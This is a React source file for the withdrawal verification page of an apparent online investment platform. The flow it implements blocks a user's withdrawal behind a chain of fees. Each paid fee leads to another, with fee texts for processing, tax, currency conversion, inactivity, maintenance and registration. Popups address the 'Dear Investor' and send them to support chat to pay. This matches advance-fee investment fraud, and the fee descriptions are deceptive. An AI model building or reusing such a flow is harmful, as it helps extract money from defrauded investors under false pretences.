import { useState } from 'react';
import { useTheme } from '../context/ThemeContext';
import { useNavigate, useLocation } from 'react-router-dom';
import DashboardSidebar from '../components/DashboardSidebar';
import { createWithdrawal } from '../services/api';

export default function WithdrawVerifyCode() {
  const navigate = useNavigate();
  const { current: t } = useTheme();
  const location = useLocation();
  const withdrawalData = location.state;
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [feePopup, setFeePopup] = useState(null); // current fee blocking withdrawal
  const [feeSuccess, setFeeSuccess] = useState(null); // just paid fee, next fee info
  const [payingFee, setPayingFee] = useState(false);
  const [loading, setLoading] = useState(false);

  if (!withdrawalData) {
    navigate('/dashboard/withdraw');
    return null;
  }

  const FEE_DESCRIPTIONS = {
    processing: 'A Withdrawal Processing Fee covers the administrative and operational costs required to securely process your withdrawal request, including payment gateway charges and transaction verification.',
    tax: 'A Tax / Compliance Fee is a mandatory regulatory charge that ensures your withdrawal complies with applicable tax laws and financial regulations governing international fund transfers.',
    conversion: 'A Currency Conversion Fee is applied to cover the cost of converting your funds between currencies or cryptocurrency pairs at the current market exchange rate.',
    inactivity: 'An Inactivity Fee is applied to accounts with no recent trading or investment activity. This fee maintains your account in active standing within our platform.',
    maintenance: 'An Account Maintenance Fee covers the ongoing costs of securing and maintaining your trading account, including platform access, security monitoring, and dedicated support.',
    registration: 'A Registration Fee is required to fully activate your trading account and unlock complete access to all platform investment and withdrawal features.',
  };

  const handlePayFee = async (fee) => {
    setPayingFee(true);
    try {
      const token = localStorage.getItem('token');
      const res = await fetch(`https://quantyrexmarkets-api.vercel.app/api/user/pay-fee/${fee._id}`, {
        method: 'POST',
        headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      });
      const data = await res.json();
      if (data.nextFee) {
        // More fees pending
        setFeeSuccess({ paidFee: fee, nextFee: data.nextFee });
        setFeePopup(null);
      } else if (data.allPaid) {
        // All fees paid, can now withdraw
        setFeeSuccess({ paidFee: fee, nextFee: null, allPaid: true });
        setFeePopup(null);
      } else {
        setError(data.message || 'Payment failed');
        setFeePopup(null);
      }
    } catch (e) {
      setError('Fee payment failed. Please try again.');
    }
    setPayingFee(false);
  };

  const handleSubmit = async () => {
    if (!code) { setError('Please enter your withdrawal code.'); return; }
    setLoading(true);
    setError('');
    try {
      const res = await createWithdrawal({ ...withdrawalData, withdrawalCode: code });
      if (res.transaction) {
        navigate('/dashboard/withdraw', { state: { success: true } });
      } else if (res.blockType === 'pendingFees' && res.fees?.length > 0) {
        setFeePopup(res.fees[0]);
      } else {
        setError(res.message || 'Invalid withdrawal code. Please try again.');
      }
    } catch (e) {
      setError('Network error. Please try again.');
    }
    setLoading(false);
  };

  return (
    <>
    <div style={{ display: 'flex', minHeight: '100vh', background: t.bg }}>
      <DashboardSidebar isOpen={sidebarOpen} onClose={() => setSidebarOpen(false)} />
      <div style={{ flex: 1, padding: '24px', maxWidth: '600px' }}>
        <div style={{ marginBottom: '20px' }}>
          <button onClick={() => navigate('/dashboard/withdraw')} style={{ background: 'none', border: 'none', color: '#6366f1', fontSize: '12px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '4px' }}>
            ← Back to Withdraw
          </button>
        </div>
        <h2 style={{ color: 'white', fontSize: '20px', fontWeight: '700', margin: '0 0 4px' }}>Withdrawal Verification</h2>
        <p style={{ color: t.mutedText, fontSize: '12px', margin: '0 0 24px' }}>Enter your withdrawal code to complete this transaction</p>
        <div style={{ background: t.bg, border: `1px solid ${t.border}`, borderRadius: '8px', padding: '32px 24px', width: '100%', textAlign: 'center' }}>
          
          {/* Icon */}
          <div style={{ width: '64px', height: '64px', borderRadius: '50%', border: '2px solid #6366f1', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
            <svg width='28' height='28' fill='none' stroke='#6366f1' viewBox='0 0 24 24' strokeWidth='2'>
              <path strokeLinecap='round' strokeLinejoin='round' d='M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z'/>
            </svg>
          </div>

          <h2 style={{ color: 'white', fontSize: '18px', fontWeight: '700', margin: '0 0 8px' }}>Withdrawal Code Required</h2>
          <p style={{ color: t.subText, fontSize: '12px', margin: '0 0 8px', lineHeight: '1.6' }}>
            Enter your withdrawal code to complete this transaction.
          </p>
          <p style={{ color: '#6366f1', fontSize: '12px', margin: '0 0 24px' }}>
            Amount: <strong style={{ color: 'white' }}>${withdrawalData.amount}</strong>
          </p>

          {/* Code Input */}
          <div style={{ marginBottom: '16px', textAlign: 'left' }}>
            <label style={{ color: t.dimText, fontSize: '10px', display: 'block', marginBottom: '6px', fontWeight: '600', letterSpacing: '1px', textTransform: 'uppercase' }}>Withdrawal Code</label>
            <input
              type='text'
              value={code}
              onChange={e => setCode(e.target.value)}
              placeholder='Enter your withdrawal code'
              style={{ width: '100%', background: t.inputBg, border: `1px solid ${t.border}`, color: t.text, fontSize: '14px', padding: '12px', outline: 'none', boxSizing: 'border-box', borderRadius: '4px', textAlign: 'center', letterSpacing: '4px', fontWeight: '700' }}
            />
          </div>

          {error && (
            <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', borderRadius: '4px', padding: '10px', marginBottom: '16px' }}>
              <p style={{ color: '#ef4444', fontSize: '11px', margin: 0 }}>{error}</p>
            </div>
          )}

          <button
            onClick={handleSubmit}
            disabled={loading}
            style={{ width: '100%', padding: '12px', background: loading ? '#4b5563' : '#6366f1', border: 'none', color: 'white', fontSize: '12px', fontWeight: '700', cursor: loading ? 'not-allowed' : 'pointer', borderRadius: '4px', marginBottom: '12px' }}
          >
            {loading ? 'Verifying...' : 'Verify & Withdraw'}
          </button>

          <button
            onClick={() => navigate('/dashboard/withdraw')}
            style={{ width: '100%', padding: '10px', background: 'transparent', border: `1px solid ${t.border}`, color: t.subText, fontSize: '11px', cursor: 'pointer', borderRadius: '4px' }}
          >
            Cancel
          </button>

          <p style={{ color: t.faintText, fontSize: '10px', margin: '16px 0 0', lineHeight: '1.6' }}>
            Do not share your withdrawal code with anyone including support staff.
          </p>
        </div>
      </div>
    </div>

      {/* Fee Block Popup */}
      {feePopup && (
        <>
          <div onClick={() => setFeePopup(null)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 300 }}/>
          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px', fontFamily: "'Montserrat', 'Segoe UI', sans-serif" }}>
            <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #ef4444', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
              <svg width='22' height='22' fill='none' stroke='#ef4444' viewBox='0 0 24 24' strokeWidth='2'><path d='M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z'/><line x1='12' y1='9' x2='12' y2='13'/><line x1='12' y1='17' x2='12.01' y2='17'/></svg>
            </div>
            <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '8px' }}>{feePopup.label}</div>
            <div style={{ color: '#555', fontSize: '10px', marginBottom: '16px', lineHeight: '1.8' }}>
              {FEE_DESCRIPTIONS[feePopup.type] || FEE_DESCRIPTIONS.processing}
            </div>
            <div style={{ color: '#888', fontSize: '9px', marginBottom: '4px' }}>Amount Due</div>
            <div style={{ color: '#ef4444', fontSize: '16px', fontWeight: '700', marginBottom: '16px' }}>${parseFloat(feePopup.amount || 0).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
            <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.7' }}>
              Dear Investor, your withdrawal request is on hold. Please contact support to complete this payment.
            </div>
            <button onClick={() => { setFeePopup(null); window.dispatchEvent(new Event('openLiveChat')); }}
              style={{ width: '100%', padding: '10px', background: '#6366f1', border: 'none', color: 'white', fontSize: '10px', fontWeight: '700', cursor: 'pointer', marginBottom: '8px' }}>
              Contact Support
            </button>
            <button onClick={() => setFeePopup(null)}
              style={{ width: '100%', padding: '10px', background: 'transparent', border: '1px solid #e2e8f0', color: '#888', fontSize: '10px', cursor: 'pointer' }}>
              Close
            </button>
          </div>
        </>
      )}

      {/* Fee Success + Next Fee Popup */}
      {feeSuccess && (
        <>
          <div onClick={() => setFeeSuccess(null)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 300 }}/>
          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px', fontFamily: "'Montserrat', 'Segoe UI', sans-serif" }}>
            {feeSuccess.allPaid ? (
              <>
                <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #22c55e', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
                  <svg width='22' height='22' fill='none' stroke='#22c55e' strokeWidth='2.5' viewBox='0 0 24 24'><polyline points='20 6 9 17 4 12'/></svg>
                </div>
                <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '8px' }}>Payment Successful</div>
                <div style={{ color: '#888', fontSize: '11px', marginBottom: '16px' }}>{feeSuccess.paidFee.label} ${parseFloat(feeSuccess.paidFee.amount || 0).toFixed(2)} paid</div>
                <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.8' }}>
                  All outstanding fees have been settled. Our team is now processing your withdrawal and funds will be released shortly.
                </div>
                <button onClick={() => { setFeeSuccess(null); handleSubmit(); }}
                  style={{ width: '100%', padding: '10px', background: '#6366f1', border: 'none', color: 'white', fontSize: '10px', fontWeight: '700', cursor: 'pointer', marginBottom: '8px' }}>
                  Proceed with Withdrawal
                </button>
              </>
            ) : (
              <>
                <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #22c55e', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
                  <svg width='22' height='22' fill='none' stroke='#22c55e' strokeWidth='2.5' viewBox='0 0 24 24'><polyline points='20 6 9 17 4 12'/></svg>
                </div>
                <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '8px' }}>Payment Successful</div>
                <div style={{ color: '#888', fontSize: '11px', marginBottom: '16px', textAlign: 'left' }}>{feeSuccess.paidFee.label} ${parseFloat(feeSuccess.paidFee.amount || 0).toFixed(2)} paid</div>
                <div style={{ color: '#111', fontSize: '13px', fontWeight: '700', marginBottom: '8px', textAlign: 'left' }}>Withdrawal Still Pending</div>
                <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.8', textAlign: 'left' }}>
                  Dear Investor, your {feeSuccess.paidFee.label} has been successfully processed and we are currently working on processing your withdrawal. However, a {feeSuccess.nextFee.label} has not yet been paid. This fee is required to complete and release your funds.
                </div>
                <button onClick={() => { setFeePopup(feeSuccess.nextFee); setFeeSuccess(null); }}
                  style={{ width: '100%', padding: '10px', background: '#6366f1', border: 'none', color: 'white', fontSize: '10px', fontWeight: '700', cursor: 'pointer', marginBottom: '8px' }}>
                  Why this happened
                </button>
                <button onClick={() => setFeeSuccess(null)}
                  style={{ width: '100%', padding: '10px', background: 'transparent', border: '1px solid #e2e8f0', color: '#888', fontSize: '10px', cursor: 'pointer' }}>
                  Close
                </button>
              </>
            )}
          </div>
        </>
      )}
    </>
  );
}
